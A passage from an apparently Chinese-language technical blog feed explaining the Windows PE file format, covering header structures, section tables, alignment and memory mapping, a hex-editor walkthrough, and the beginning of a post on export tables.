class="comment">// 指向符号表(主要用于调试)</span></span><br><span class="line"></span><br><span class="line">+<span class="number">10</span>h 	DWORD 		NumberOfSymbols;			<span class="comment">// 符号表中符号个数(同上)</span></span><br><span class="line"></span><br><span class="line">+<span class="number">14</span>h  	WORD  		SizeOfOptionalHeader;		<span class="comment">// IMAGE_OPTIONAL_HEADER32 结构大小</span></span><br><span class="line"></span><br><span class="line">+<span class="number">16</span>h  	WORD  		Characteristics;				<span class="comment">// 文件属性</span></span><br><span class="line"></span><br><span class="line">&#125; IMAGE_FILE_HEADER,  *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure>

<p>（1）Machine：可执行文件的目标CPU类型，WORD类型 长度为4字节</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211012123430885.png" alt="image-20211012123430885"></p>
<p>（2）NumberOfSection：区块的数目(IMAGE_NT_HEADERS ) WORD类型 2字节</p>
<p>（3）TimeDataStamp: 表明文件是何时被创建的 DWORD 4字节</p>
<p>​    TimeDataStamp: 表明文件是何时被创建的。</p>
<p>这个值是自1970年1月1日以来用格林威治时间（GMT）计算的秒数，这个值是比文件系统（FILESYSTEM）的日期时间更加精确的指示器</p>
<p>VC的话可以用_ctime 函数或者 gmtime 函数。</p>
<p>（4）PointerToSymbolTable: COFF 符号表的文件偏移位置，现在基本没用了</p>
<p>（5）NumberOfSymbols: 如果有COFF 符号表，它代表其中的符号数目，COFF符号是一个大小固定的结构，如果想找到COFF 符号表的结束位置，则需要这个变量。</p>
<p>（6）SizeOfOptionalHeader: 紧跟着IMAGE_FILE_HEADER 后边的数据结构（IMAGE_OPTIONAL_HEADER）的大小。(对于32位PE文件，这个值通常是00E0h；对于64位PE32+文件，这个值是00F0h )。</p>
<p>SizeOfOptionalHeader相较PE头偏移<strong>14h</strong>注意，偏移量是16进制的，拿到x64位系统下的IMAGE_OPTIONAL_HEADER32的结构大小0x00F0 <strong>(注意大小头问题!!!!)</strong></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211012231010016.png" alt="image-20211012231010016"></p>
<p>（7）Characteristics: 文件属性，有选择的通过几个值可以运算得到。( 这些标志的有效值是定义于 winnt.h 内的  IMAGE_FILE_** 的值，具体含义见下表。普通的EXE文件这个字段的值一般是 0100h，DLL文件这个字段的值一般是  210Eh。)多种属性可以通过 “或运算” 使得同时拥有！</p>
<table>
<thead>
<tr>
<th>Value</th>
<th align="center">Meaning</th>
</tr>
</thead>
<tbody><tr>
<td>IMAGE_FILE_RELOCS_STRIPPED  0x0001</td>
<td align="center">Relocation information was stripped from the file. The file must be loaded at its preferred base address. If the base address is not available, the loader reports an error.</td>
</tr>
<tr>
<td>IMAGE_FILE_EXECUTABLE_IMAGE0x0002</td>
<td align="center">The file is executable (there are no unresolved external references).</td>
</tr>
<tr>
<td>IMAGE_FILE_LINE_NUMS_STRIPPED0x0004</td>
<td align="center">COFF line numbers were stripped from the file.</td>
</tr>
<tr>
<td>IMAGE_FILE_LOCAL_SYMS_STRIPPED0x0008</td>
<td align="center">COFF symbol table entries were stripped from file.</td>
</tr>
<tr>
<td>IMAGE_FILE_AGGRESIVE_WS_TRIM0x0010</td>
<td align="center">Aggressively trim the working set. This value is obsolete as of Windows 2000.</td>
</tr>
<tr>
<td>IMAGE_FILE_LARGE_ADDRESS_AWARE0x0020</td>
<td align="center">The application can handle addresses larger than 2 GB.</td>
</tr>
<tr>
<td>IMAGE_FILE_BYTES_REVERSED_LO0x0080</td>
<td align="center">The bytes of the word are reversed. This flag is obsolete.</td>
</tr>
<tr>
<td>IMAGE_FILE_32BIT_MACHINE0x0100</td>
<td align="center">The computer supports 32-bit words.</td>
</tr>
<tr>
<td>IMAGE_FILE_DEBUG_STRIPPED0x0200</td>
<td align="center">Debugging information was removed and stored separately in another file.</td>
</tr>
<tr>
<td>IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP0x0400</td>
<td align="center">If the image is on removable media, copy it to and run it from the swap file.</td>
</tr>
<tr>
<td>IMAGE_FILE_NET_RUN_FROM_SWAP0x0800</td>
<td align="center">If the image is on the network, copy it to and run it from the swap file.</td>
</tr>
<tr>
<td>IMAGE_FILE_SYSTEM0x1000</td>
<td align="center">The image is a system file.</td>
</tr>
<tr>
<td>IMAGE_FILE_DLL0x2000</td>
<td align="center">The image is a DLL file. While it is an executable file, it cannot be run directly.</td>
</tr>
<tr>
<td>IMAGE_FILE_UP_SYSTEM_ONLY0x4000</td>
<td align="center">The file should be run only on a uniprocessor computer.</td>
</tr>
<tr>
<td>IMAGE_FILE_BYTES_REVERSED_HI0x8000</td>
<td align="center">The bytes of the word are reversed. This flag is obsolete.</td>
</tr>
</tbody></table>
<h3 id="IMAGE-OPTIONAL-HEADER结构"><a href="#IMAGE-OPTIONAL-HEADER结构" class="headerlink" title="IMAGE_OPTIONAL_HEADER结构"></a>IMAGE_OPTIONAL_HEADER结构</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> typedef struct _IMAGE_OPTIONAL_HEADER </span><br><span class="line">&#123;</span><br><span class="line">    //</span><br><span class="line">    // Standard fields.  </span><br><span class="line">    //</span><br><span class="line">+18h    WORD    Magic;         // 标志字, ROM 映像（0107h）,普通可执行文件（010Bh）</span><br><span class="line">+1Ah    BYTE      MajorLinkerVersion;     // 链接程序的主版本号</span><br><span class="line">+1Bh    BYTE      MinorLinkerVersion;     // 链接程序的次版本号</span><br><span class="line">+1Ch    DWORD   SizeOfCode;     // 所有含代码的节的总大小</span><br><span class="line">+20h    DWORD   SizeOfInitializedData;    // 所有含已初始化数据的节的总大小</span><br><span class="line">+24h    DWORD   SizeOfUninitializedData; // 所有含未初始化数据的节的大小</span><br><span class="line">+28h    DWORD   AddressOfEntryPoint;    // 程序执行入口RVA</span><br><span class="line">+2Ch    DWORD   BaseOfCode;      // 代码的区块的起始RVA</span><br><span class="line">+30h    DWORD   BaseOfData;      // 数据的区块的起始RVA</span><br><span class="line">    //</span><br><span class="line">    // NT additional fields.    以下是属于NT结构增加的领域。</span><br><span class="line">    //</span><br><span class="line">+34h    DWORD   ImageBase;      // 程序的首选装载地址</span><br><span class="line">+38h    DWORD   SectionAlignment;      // 内存中的区块的对齐大小</span><br><span class="line">+3Ch    DWORD   FileAlignment;      // 文件中的区块的对齐大小</span><br><span class="line">+40h    WORD    MajorOperatingSystemVersion;  // 要求操作系统最低版本号的主版本号</span><br><span class="line">+42h    WORD    MinorOperatingSystemVersion;  // 要求操作系统最低版本号的副版本号</span><br><span class="line">+44h    WORD    MajorImageVersion;       // 可运行于操作系统的主版本号</span><br><span class="line">+46h    WORD    MinorImageVersion;       // 可运行于操作系统的次版本号</span><br><span class="line">+48h    WORD    MajorSubsystemVersion;  // 要求最低子系统版本的主版本号</span><br><span class="line">+4Ah    WORD    MinorSubsystemVersion;  // 要求最低子系统版本的次版本号</span><br><span class="line">+4Ch    DWORD   Win32VersionValue;       // 莫须有字段，不被病毒利用的话一般为0</span><br><span class="line">+50h    DWORD   SizeOfImage;       // 映像装入内存后的总尺寸</span><br><span class="line">+54h    DWORD   SizeOfHeaders;       // 所有头 + 区块表的尺寸大小</span><br><span class="line">+58h    DWORD   CheckSum;       // 映像的校检和</span><br><span class="line">+5Ch    WORD    Subsystem;       // 可执行文件期望的子系统</span><br><span class="line">+5Eh    WORD    DllCharacteristics;       // DllMain()函数何时被调用，默认为 0</span><br><span class="line">+60h    DWORD   SizeOfStackReserve;       // 初始化时的栈大小</span><br><span class="line">+64h    DWORD   SizeOfStackCommit;       // 初始化时实际提交的栈大小</span><br><span class="line">+68h    DWORD   SizeOfHeapReserve;        // 初始化时保留的堆大小</span><br><span class="line">+6Ch    DWORD   SizeOfHeapCommit;        // 初始化时实际提交的堆大小</span><br><span class="line">+70h    DWORD   LoaderFlags;        // 与调试有关，默认为 0 </span><br><span class="line">+74h    DWORD   NumberOfRvaAndSizes;  // 下边数据目录的项数，这个字段自Windows NT 发布以来        // 一直是16</span><br><span class="line">+78h    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES] ;</span><br><span class="line">       // 数据目录表,里面的数组[]一直以来都为16个元素,可以直接写为</span><br><span class="line">  IMAGE_DATA_DIRECTORY DataDirectory[16]</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>以上结构中的大部分字段都不重要，我们可以从注释中进行理解使用，不必死记硬背，接下来解释其中较为重要的字段</p>
<ul>
<li><p><strong>AddressOfEntryPoint字段</strong>(+28h) DWORD 32位下4 byte</p>
<p>指出文件被执行时的入口地址，这是一个RVA地址(相对虚拟地址)如果在一个可执行文件上附加了一段代码并想让这段代码首先被执行，那么只需要让这个入口地址指向附加的代码就可以了。</p>
<p>PE头基地址为140h+28h偏移并根据大小端模式可看出入口的相对虚拟地址为0X000C0CB4 </p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211012210838177.png" alt="image-20211012210838177"></p>
</li>
<li><p><strong>ImageBase</strong>(+34h)</p>
<p>ImageBase字段指出文件的优先装入地址。也就是说当文件被执行时如果可能的话，Windows优先将文件装入指定的内存地址，若该内存地址已被其他模块占用时，文件才被装入到其他空余的内存地址当中。链接器产生可执行文件的时候对应这个地址来生成机器码。所以当文件可装入这个内存地址时，不需要重定向操作，装入的速度最快，若<strong>ImageBase</strong>指定的内存地址被占用，那么链接器将不得不重定向空余内存地址将PE文件装入，相比之下，会慢上一些。</p>
<p>PE头基地址为140h+34h</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211012210558148.png" alt="image-20211012210558148"></p>
</li>
</ul>
<p>另外，虚拟地址空间与物理地址空间并不是一个东西，不可以混为一谈，我们可以这么理解，我们c/c++程序中访问的内存地址，并不是实际上的物理内存地址，而是虚拟内存地址，程序访问内存地址时，先是访问虚拟地址，通过页表等手段将虚拟地址映射到物理内存地址上，如此进行间接的访问物理内存地址。并且由于每个程序都有自己的虚拟内存地址，其映射出的物理内存地址也不同，可通过此手段对内存地址进行隔离。</p>
<p>​    <strong>对于EXE文件来说</strong>，由于每个文件总是使用独立的虚拟地址空间，优先装入地址不可能被其他模块占据，所以EXE总是能按照此地址装入，这也意味着EXE文件不需重定位信息</p>
<p>​    <strong>对于DLL文件来说</strong>，由于多个DLL文件共享使用宿主EXE文件的地址空间，不能保证优先装入地址没有被其他的DLL使用，所以DLL文件必须包含重定位信息以防万一。因此前面的IMAGE_FILE_HEADER结构的Characteristics字段中，DLL文件对应的IMAGE_FILE_RELOCS_STRIPPED位总为0，而EXE文件的这个标志位总为1.</p>
<p>​    在链接的时候，可以通过对link.exe指定/base:address选项来自定义优先装入地址，如果不指定这个选项的话，一般EXE文件的默认优先装入地址被定位00400000h,而DLL文件的默认优先装入地址被定为10000000h。</p>
<ul>
<li><strong>SectionAlignment字段和FileAlignment字段</strong></li>
</ul>
<p>SectionAlignment字段制定了节被装入福内存后的对其单位。也就是说每个节被装入的地址必定是本字段指定数值的整数倍。而FileAligment字段制定了节存储在磁盘文件中时的对齐单位。</p>
<ul>
<li><p><strong>IMAGE_DATA_DIRECTORY [IMAGE_NUMBEROF_DIRECTORY_ENTRIES]</strong></p>
<p>这个字段可以说是最重要的字段之一，他由16个相同的IMAGE_DATA_DIRECTORY结构组成，虽然PE文件中的数据是按照装入内存后的页属性归类而被放在不同的节中的，但这些处于各个节中的数据按照用途可以分为导出表、导入表、资源、重定位表等数据块，这16个IMAGE_DATA_DIRECTORY结构就是用来定义多种不同用途的数据块的。IMAGE_DATA_DIRECTORY 结构定义比较简单，它仅仅指出了某种数据块的长度和位置。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD VirtualAddress; <span class="comment">//数据的相对虚拟地址(RVA)</span></span><br><span class="line">    DWORD Size; <span class="comment">//数据的大小</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>各个数据目录列表的含义：</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211012204106567.png" alt="image-20211012204106567"></p>
<p>在PE文件中找寻特定的数据时就是从这些IMAGE_DATA_DIRECTORY结构开始的，比如要存取资源，那么就必须从第三个IMAGE_DATA_DIRECTORY结构（索引为2）中获得资源数据块的大小和位置；同理，如果要查看PE文件导入了哪些DLL文件的那些API函数，那就必须首先从第二个IMAGE_DATA_DIRECTORY结构得到导入表的位置与大小。</p>
<h3 id="IMAGE-SECTION-HEADER结构"><a href="#IMAGE-SECTION-HEADER结构" class="headerlink" title="IMAGE_SECTION_HEADER结构"></a>IMAGE_SECTION_HEADER结构</h3><p>区块表（节表）：</p>
<p>PE文件中所有节的属性都被定义在节表中，节表由一系列的IMAGE_SECTION_HEADER结构排列而成，每个结构用来 描述一个节，结构的排列顺序和它们描述的节在文件中的排列顺序是一致的。全部有效结构的最后以一个空的IMAGE_SECTION_HEADER结构作为 结束，所以节表中总的IMAGE_SECTION_HEADER结构数量等于节的数量加一。节表总是被存放在紧接在PE文件头的地方。<br>另外，节表中 IMAGE_SECTION_HEADER 结构的总数总是由PE文件头 IMAGE_NT_HEADERS 结构中的 FileHeader.NumberOfSections 字段来指定的。</p>
<p>此结构体共占40个字节</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> </span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">+<span class="number">0</span>h BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; <span class="comment">// 节表名称,如“.text” </span></span><br><span class="line"><span class="comment">//IMAGE_SIZEOF_SHORT_NAME=8</span></span><br><span class="line"><span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">+8<span class="title">h</span> &#123;</span></span><br><span class="line">DWORD PhysicalAddress; <span class="comment">// 物理地址</span></span><br><span class="line">DWORD VirtualSize; <span class="comment">// 真实长度，这两个值是一个联合结构，可以使用其中的任何一个，一</span></span><br><span class="line"><span class="comment">// 般是取后一个</span></span><br><span class="line">&#125; Misc;</span><br><span class="line">+ch DWORD VirtualAddress; <span class="comment">// 节区的 RVA 地址</span></span><br><span class="line">+<span class="number">10</span>h DWORD SizeOfRawData; <span class="comment">// 在文件中对齐后的尺寸</span></span><br><span class="line">+<span class="number">14</span>h DWORD PointerToRawData; <span class="comment">// 在文件中的偏移量</span></span><br><span class="line">+<span class="number">18</span>h DWORD PointerToRelocations; <span class="comment">// 在OBJ文件中使用，重定位的偏移</span></span><br><span class="line">+<span class="number">1</span>ch DWORD PointerToLinenumbers; <span class="comment">// 行号表的偏移（供调试使用地）</span></span><br><span class="line">+<span class="number">1</span>eh WORD NumberOfRelocations; <span class="comment">// 在OBJ文件中使用，重定位项数目</span></span><br><span class="line">+<span class="number">20</span>h WORD NumberOfLinenumbers; <span class="comment">// 行号表中行号的数目</span></span><br><span class="line">+<span class="number">24</span>h DWORD Characteristics; <span class="comment">// 节属性如可读，可写，可执行等&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span></span><br></pre></td></tr></table></figure>

<p><strong>Name： 区块名</strong>。这是一个由8位的ASCII  码名，用来定义区块的名称。多数区块名都习惯性以一个“.”作为开头（例如：.text），这个“.”  实际上是不是必须的。值得我们注意的是，如果区块名超过 8 个字节，则没有最后的终止标志“NULL” 字节。并且前边带有一个“$”  的区块名字会从连接器那里得到特殊的待遇，前边带有“$” 的相同名字的区块在载入时候将会被合并，在合并之后的区块中，他们是按照“$”  后边的字符的字母顺序进行合并的。<br>另外每个区块的名称都是唯一的，不能有同名的两个区块。但事实上节的名称不代表任何含义，他的存在仅仅是为了正 规统一编程的时候方便程序员查看方便而设置的一个标记而已。所以将包含代码的区块命名为“.Data” 或者说将包含数据的区块命名为“.Code”  都是合法的。当我们要从PE 文件中读取需要的区块时候，不能以区块的名称作为定位的标准和依据，正确的方法是按照  IMAGE_OPTIONAL_HEADER32 结构中的数据目录字段结合进行定位。</p>
<ul>
<li><strong>Virtual Size:</strong> 该表对应的区块大小，这是区块的数据在没有进行对齐处理前的实际大小</li>
<li><strong>Virtual address:</strong> <strong>该区块装载到内存中的RVA 地址</strong>。这个地址是按照内存页来对齐的，因此它的数值总是 SectionAlignment  的值的整数倍。在Microsoft 工具中，第一个快的默认 RVA 总为1000h。在OBJ 中，该字段没有意义地，并被设为0。</li>
<li><strong>SizeOfRawData:</strong> 该区块在磁盘中所占的大小。在可执行文件中，该字段的大小是已经被FileAlignment进行对齐过的长度。(FileAlignment 是磁盘中PE文件对齐标准的字段，默认大小为200h，SectionAlignment 是内存中PE文件对齐标准的字段，默认大小为1000h )</li>
<li><strong>PointerToRawData: 该区块在磁盘中的偏移。</strong> 这个数值是从文件头开始算起的偏移量 </li>
<li><strong>PointerToRelocations：</strong>这哥们在EXE文件中没有意义，<strong>在OBJ 文件中，表示本区块重定位信息的偏移值</strong>。（在OBJ 文件中如果不是零，它会指向一个IMAGE_RELOCATION 结构的数组）</li>
<li><strong>PointerToLinenumbers：行号表在文件中的偏移值</strong>，文件的调试信息，于我们没用，鸡肋。</li>
<li><strong>NumberOfRelocations：</strong>这哥们在EXE文件中也没有意义，<strong>在OBJ 文件中，是本区块在重定位表中的重定位数目</strong>来着。</li>
<li><strong>Characteristics：该区块的属性</strong>。该字段是按位来指出区块的属性（如代码/数据/可读/可写等）的标志。</li>
</ul>
<h3 id="区块描述、对齐值以及RVA详解"><a href="#区块描述、对齐值以及RVA详解" class="headerlink" title="区块描述、对齐值以及RVA详解"></a>区块描述、对齐值以及RVA详解</h3><p>通常，区块中的数据在逻辑上是关联的。PE  文件一般至少都会有两个区块：一个是代码块，另一个是数据块。每一个区块都需要有一个截然不同的名字，这个名字主要是用来表达区块的用途。例如有一个区块叫.rdata，表明他是一个只读区块。注意：区块在映像中是按起始地址（RVA）来排列的，而不是按字母表顺序。  </p>
<p>  另外，使用区块名字只是人们为了认识和编程的方便，而对操作系统来说这些是无关紧要的。微软给这些区块取了个有特色的名字，但这不是必须的。当编程从PE 文件中读取需要的内容时，如输入表、输出表，不能以区块名字作为参考，正确的方法是按照数据目录表中的字段来进行定位。  </p>
<p>  <strong>下表中的区块名称以及意义：</strong>  </p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/634_82c_216.jpg" alt="634_82c_216"></p>
<p> 我们再Visual C++ 中也可以自己命名区块，用#pragma来声明， 告诉编译器插入数据到一个区块中，格式如下：</p>
<p>​    <strong>#pragma data_msg(“FC_data”)</strong></p>
<p>以上语句告诉编译器将数据全都放入”FC-data” 的区块中，而不是默认的.data区块内。区块一般是从obj文件开始，被编译器防止。链接器用于合并OBJ和库中需要的块，使其称为一个最终合适的区块。链接器会遵循一套相当完整的规则，他会判断哪些区块将被合并以及如何被合并。</p>
<p><strong>合并区块：</strong> 链接器可以合并区块。如果两个区块有相似、一致性的属性，那么他们在链接的时候能够被合并成一个单一的区块。这取决于编译器是否开启了/merge开关。由于区块存在对齐问题，如果PE文件中存在大量相似的区块而不进行合并，这样会对内存资源造成极大的浪费 *<em>注意：（我们不可以将.rsrc、.reloc、.pdata 合并到</em>***的区块中。</p>
<p>之前我们简单了解过区块是要对齐的，无论是在内存中存放还是在磁盘中存放~  但他们一般的对齐值是不同的。</p>
<p> PE 文件头里边的FileAligment 定义了磁盘区块的对齐值。每一个区块从对齐值的倍数的偏移位置开始存放。而区块的实际代码或数据的大小不一定刚好是这么多，所以在多余的地方一般以00h 来填充，这就是区块间的间隙。</p>
<p><strong>区块的对齐值</strong></p>
<p> 例如，在PE文件中，一个典型的对齐值是200h ，这样，每个区块都将从200h 的倍数的文件偏移位置开始，假设第一个区块在400h  处，长度为90h，那么从文件400h 到490h  为这一区块的内容，而由于文件的对齐值是200h，所以为了使这一区块的长度为FileAlignment 的整数倍，490h 到 600h  这一个区间都会被00h 填充，这段空间称为区块间隙，下一个区块的开始地址为600h 。</p>
<p> PE 文件头里边的SectionAligment 定义了内存中区块的对齐值。PE 文件被映射到内存中时，区块总是至少从一个页边界开始。</p>
<p> 一般在X86 系列的CPU 中，页是按4KB（1000h）来排列的；在IA-64 上，是按8KB（2000h）来排列的。所以在X86 系统中，PE文件区块的内存对齐值一般等于 1000h，每个区块按1000h 的倍数在内存中存放。</p>
<h3 id="PE文件到内存的映射"><a href="#PE文件到内存的映射" class="headerlink" title="PE文件到内存的映射"></a>PE文件到内存的映射</h3><h3 id="PE文件到内存的映射-1"><a href="#PE文件到内存的映射-1" class="headerlink" title="PE文件到内存的映射"></a>PE文件到内存的映射</h3><ul>
<li>在执行一个PE文件的时候，Windows并不是在一开始就将整个文件读入内存的，而是采用与内存映射文件类似的机制但又不完全相同；内存映射所写入物理内存中的文件与磁盘文件相比，相对位置完全相同，而Windows装载器装载的EXE等文件时，会产生重定位对某些数据进行预处理，装载到物理内存等待系统使用，使得磁盘文件与物理内存文件的相对位置不同。</li>
<li>也就是Windows装载器在装载的时候仅仅建立好了虚拟地址与PE文件之间的映射关系，与我上文写的一致。</li>
<li>当且仅当真正执行至某个内存页中的指令或访问某一页中的数据时，这个页面才会被从磁盘提交到物理内存之中，这种机制使得文件装入的速度和文件的大小并没有太大关系，而是与CPU关系大。</li>
<li>Windows装载器在装载DOS部分、PE文件头部分和区块表（节表）部分是不进行任何特殊处理的，而在装载节（区块）的时候则会自动对照区块表（节表）的属性做不同的处理</li>
<li>一般情况下，它会处理以下几个方面的内容：<ul>
<li>内存页的属性;</li>
<li>节的偏移地址;</li>
<li>节的尺寸;</li>
<li>不进行映射的节;</li>
</ul>
</li>
</ul>
<p><strong>内存页的属性</strong>：</p>
<p>对于磁盘映射文件来说，所有的页都是按照磁盘映射文件函数指定的属性来设置的。但是在装载可执行文件的时候，与节对应的内存页属性需要按照节的属性来设置。所以在同属于一个模块的内存页中，从不同节映射来的内存页的属性是不同的。</p>
<p><strong>节的偏移地址：</strong></p>
<p>节的起始地址在磁盘文件中是按照IMAGE_OPTIONAL_HEADER32结构的 FileAlignment 字段的值进行对齐，而当被加载到内存中时是按照同一结构的SectionAlignment 字段的值对齐的，两者的值可能不同，所以当一个节被装入内存后相对于文件头的偏移和在磁盘文件中的偏移可能是不同的。</p>
<p>这就是为什么PE文件在载入虚拟空间地址后偏移地址会发生比例改变的原因。</p>
<p>注意：<strong>节实际上就是相同属性数据的组合</strong> 当节被装入内存中时，相同一个内存所对应的内存页都将被赋予相同的页属性，实际上，windows系统对内存属性的设置时以页为单位进行的，所以节在内存中的对齐单位必须至少是一个页的大小。</p>
<p><strong>对于32位操作系统来说，这个值一般是4KB==1000H; 对于64位操作系统这个值一般是8KB==2000H）</strong></p>
<p><strong>当我们需要从PE文件中读取区块的时候，不能以区块的名称作为定位的标准或依据，正确的方法是按照IMAGE_OPTIONAL_HEADER32结构中的数据目录字段进行定位</strong></p>
<h2 id="实际操作展示"><a href="#实际操作展示" class="headerlink" title="实际操作展示"></a>实际操作展示</h2><h3 id="利用IMAGE-DOS-HEADER进行跳转"><a href="#利用IMAGE-DOS-HEADER进行跳转" class="headerlink" title="利用IMAGE_DOS_HEADER进行跳转"></a>利用IMAGE_DOS_HEADER进行跳转</h3><p>e_magic变量的值为0X4D5A 对应的MZ 即为DOS头部的标示，DOS可执行文件标示。</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211012120145749.png" alt="image-20211012120145749"></p>
<p>利用e_lfanew使pe文件由DOS头位置跳转至PE文件头位置。</p>
<p>e_lfanew处的偏移量由于应该是高位地址在前，低位地址在后，顺序应颠倒-&gt;00 00 01 40 即 140h 此处偏移地址是根据基地址来看，因此应该是00 00 00 00 + 00 00 01 40 = 00 00 01 40</p>
<p>根据偏移地址可以找到140h 即为PE文件头的起始偏移量，加上基地址就可找到PE文件头的指针，来到PE文件头</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211012120542254.png" alt="image-20211012120542254"></p>
<h3 id="找出IMAGE-NT-HEADERS中IMAGE-OPTIONAL-HEADER32的地址"><a href="#找出IMAGE-NT-HEADERS中IMAGE-OPTIONAL-HEADER32的地址" class="headerlink" title="找出IMAGE_NT_HEADERS中IMAGE_OPTIONAL_HEADER32的地址"></a>找出IMAGE_NT_HEADERS中IMAGE_OPTIONAL_HEADER32的地址</h3><p>利用IMAGE_FILE_HEADER结构中SizeOfOptionalHeader（+14h）找出IMAGE_OPTIONAL_HEADER32结构的大小。</p>
<p>根据PE头+14h可找到SizeOFoptionHeader的值0X00F0，转化为10进制可得出IMAGE_OPTIONAL_HEADER32结构大小为240</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211013095656163.png" alt="image-20211013095656163"></p>
<p>其次，根据IMAGE_NT_HEADERS结构体的IMAGE_OPTIONAL_HEADER32（+18h）拿到IMAGE_OPTIONAL_HEADER32的起始地址</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211013095854695.png" alt="image-20211013095854695"></p>
<p>利用起始地址+结构大小=整个结构 可知，IMAGE_OPTIONAL_HEADER32的结构的起始地址为158h结束地址为248h 第一次算没把158当成16进制，直接算错了(笑)</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211013100616071.png" alt="image-20211013100616071"></p>
]]></content>
      <categories>
        <category>PE结构</category>
      </categories>
      <tags>
        <tag>PE结构</tag>
      </tags>
  </entry>
  <entry>
    <title>PE结构-导出表(3)</title>
    <url>/2021/10/14/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8(3)/</url>
    <content><![CDATA[<h1 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a><strong>导出表</strong></h1><h4 id="导出表的作用"><a href="#导出表的作用" class="headerlink" title="导出表的作用"></a><strong>导出表的作用</strong></h4><p>一个可执行程序是由<strong>多个PE文件</strong>构成的</p>
<p>利用EverEdit.exe为例，查看运行他所需的所有模块</p>
<p>使用od载入程序，利用<em>e</em>查看载入的模块（dll与exe程序，PE文件载入内存后可称作模块）</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015112208833.png" alt="image-20211015112208833"></p>
<p>我们可以看出，该程序除了载入自身exe程序外，还在外部动态链接了大量dll文件，这些dll为程序提供了运行所需的一些函数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;!--more--&gt;</span><br></pre></td></tr></table></figure>

<p>就比如MessageBoxA的弹窗函数就是由User32.dll模块提供</p>
<p>以上的每个模块都发挥着其作用，使得程序得以正常运行</p>
<p>一个程序引用哪些模块是由<strong>其导入表</strong>决定的</p>
<p>与导入表相对应的便是<strong>导出表</strong>，导出表则是决定当前PE文件<strong>能给其他PE文件提供的函数</strong></p>
<p>拿User32.dll举例，它的导出表结构中，一定包含着MessageBoxA这个函数,否则它不可能提供这个函数给程序。</p>
<hr>
<p><strong>导入表与导出表概念总结</strong>:</p>
<ul>
<li>导出表:设置本PE文件可以将什么函数提供给其他PE文件</li>
<li>导入表:该PE文件可以使用哪些PE文件。</li>
</ul>
<p><strong>个人理解</strong>，PE文件中的导入表像是C/C++中的#include <xxx> 包含另一个文件来使用其中的函数，导出表便是其头文件，可使用的函数便是头文件中所声明的函数那般。</xxx></p>
<h2 id="何为导出表？"><a href="#何为导出表？" class="headerlink" title="何为导出表？"></a>何为导出表？</h2><p>导出表便是记录该PE文件提供给其他PE文件的函数的一种结构</p>
<h3 id="定位导出表"><a href="#定位导出表" class="headerlink" title="定位导出表"></a>定位导出表</h3><h4 id="定位导出表的原理"><a href="#定位导出表的原理" class="headerlink" title="定位导出表的原理"></a>定位导出表的原理</h4><p>导出表的定位可以利用PE文件_IMAGE_OPTIONAL_HEADER32中的DataDirectory结构进行定位。</p>
<p>DataDirecoty是一个长为16的数组，<strong>每个数组成员对应一个表</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">成员										数据宽度</span><br><span class="line"></span><br><span class="line">DataDirectory[<span class="number">16</span>] 	IMAGE_DATA_DIRECTORY[<span class="number">16</span>]=<span class="number">128</span>字节</span><br></pre></td></tr></table></figure>

<p>数据目录中共有16个表</p>
<p>根据表的结构可知，导出表的下标为0</p>
<p>即DataDirectory[0]表示导出表</p>
